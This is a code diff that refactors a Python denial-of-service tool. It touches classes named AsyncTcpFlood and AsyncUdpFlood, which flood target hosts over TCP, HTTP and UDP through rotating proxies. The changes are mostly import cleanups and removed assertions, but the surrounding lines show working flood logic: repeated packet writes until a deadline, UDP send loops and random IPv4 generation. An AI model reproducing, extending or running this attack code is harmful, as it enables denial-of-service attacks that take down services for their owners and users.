@@ -1,23 +1,21 @@
 import asyncio
 import errno
+import math
 import random
-import socket as _socket
+import struct
+import time
 from copy import copy
 from functools import partial
-from math import log2, trunc
 from os import urandom as randbytes
-from random import choice
-from socket import (AF_INET, SOCK_DGRAM, inet_ntoa, socket)
+from socket import (AF_INET, SOCK_DGRAM, SOL_SOCKET, SO_RCVBUF, inet_ntoa, socket)
 from ssl import CERT_NONE, SSLContext, create_default_context
 from string import ascii_letters
-from struct import pack as data_pack
 from threading import Event
-from time import time
 from typing import Callable, Optional, Set, Tuple
 from urllib import parse
 
 import aiohttp
-from async_timeout import timeout
+import async_timeout
 from yarl import URL
 
 from . import proxy_proto
@@ -70,7 +68,7 @@ class Tools:
         MULTIPLES = ["Bit", "kBit", "MBit", "GBit"]
         if i > 0:
             base = 1024
-            multiple = trunc(log2(i) / log2(base))
+            multiple = math.trunc(math.log2(i) / math.log2(base))
             value = i / pow(base, multiple)
             return f'{value:.2f} {MULTIPLES[multiple]}'
         else:
@@ -89,7 +87,7 @@ class Tools:
     def parse_params(url, ip, proxies):
         result = url.host.lower().endswith(rotate_suffix)
         if result:
-            return choice(rotate_params), NoProxySet
+            return random.choice(rotate_params), NoProxySet
         return (url, ip), proxies
 
     @staticmethod
@@ -99,7 +97,7 @@ class Tools:
     @staticmethod
     def rand_ipv4():
         return inet_ntoa(
-            data_pack('>I', random.randint(1, 0xffffffff))
+            struct.pack('>I', random.randint(1, 0xffffffff))
         )
 
 
@@ -163,7 +161,7 @@ class AsyncTcpFlood:
         event: Event,
         proxies: ProxySet,
         stats: TargetStats,
-        loop=None,
+        loop,
         settings: Optional[AttackSettings] = None
     ) -> None:
         self.SENT_FLOOD = None
@@ -251,7 +249,6 @@ class AsyncTcpFlood:
         return request.encode()
 
     async def run(self, on_connect=None) -> bool:
-        assert self._loop is not None, "Event loop has to be set to run async flooder"
         try:
             return await self.SENT_FLOOD(on_connect=on_connect)
         except OSError as exc:
@@ -308,12 +305,11 @@ class AsyncTcpFlood:
             conn = self._loop.create_connection(
                 flood_proto, host=proxy.proxy_host, port=proxy.proxy_port)
         try:
-            async with timeout(self._settings.connect_timeout_seconds):
+            async with async_timeout.timeout(self._settings.connect_timeout_seconds):
                 transport, _ = await conn
             sock = transport.get_extra_info("socket")
             if sock and hasattr(sock, "setsockopt"):
-                sock.setsockopt(
-                    _socket.SOL_SOCKET, _socket.SO_RCVBUF, self._settings.socket_rcvbuf)
+                sock.setsockopt(SOL_SOCKET, SO_RCVBUF, self._settings.socket_rcvbuf)
         except asyncio.CancelledError as e:
             if on_connect:
                 on_connect.cancel()
@@ -437,7 +433,7 @@ class AsyncTcpFlood:
                         self._stats.track(1, request_info_size(response.request_info))
                         packets_sent += 1
                         # XXX: we need to track in/out traffic separately
-                        async with timeout(self._settings.http_response_timeout_seconds):
+                        async with async_timeout.timeout(self._settings.http_response_timeout_seconds):
                             await response.read()
             finally:
                 self._stats.track_close_connection()
@@ -450,10 +446,10 @@ class AsyncTcpFlood:
         def _gen():
             yield FloodOp.WRITE, (packet, packet_size)
             yield FloodOp.SLEEP, 5.01
-            deadline = time() + 120
+            deadline = time.time() + 120
             for _ in range(self._settings.requests_per_connection):
                 yield FloodOp.WRITE, (packet, packet_size)
-                if time() > deadline:
+                if time.time() > deadline:
                     return
 
         return await self._generic_flood_proto(FloodSpecType.GENERATOR, _gen(), on_connect)
@@ -551,7 +547,7 @@ class AsyncUdpFlood:
         event: Event,
         proxies: ProxySet,
         stats: TargetStats,
-        loop=None,
+        loop,
         settings: Optional[AttackSettings] = None,
     ):
         self.SENT_FLOOD = None
@@ -565,18 +561,17 @@ class AsyncUdpFlood:
         self.SENT_FLOOD = getattr(self, method)
 
     async def run(self) -> bool:
-        assert self._loop is not None, "Event loop has to be set to run async flooder"
         return await self.SENT_FLOOD()
 
     async def _generic_flood(self, packet_gen: Callable[[], Tuple[bytes, int]]) -> bool:
         packets_sent = 0
         with socket(AF_INET, SOCK_DGRAM) as sock:
-            async with timeout(self._settings.connect_timeout_seconds):
+            async with async_timeout.timeout(self._settings.connect_timeout_seconds):
                 await self._loop.sock_connect(sock, self._target)
             while True:
                 packet, packet_size = packet_gen()
                 try:
-                    async with timeout(self._settings.drain_timeout_seconds):
+                    async with async_timeout.timeout(self._settings.drain_timeout_seconds):
                         await self._loop.sock_sendall(sock, packet)
                 except OSError as exc:
                     if exc.errno == errno.ENOBUFS:
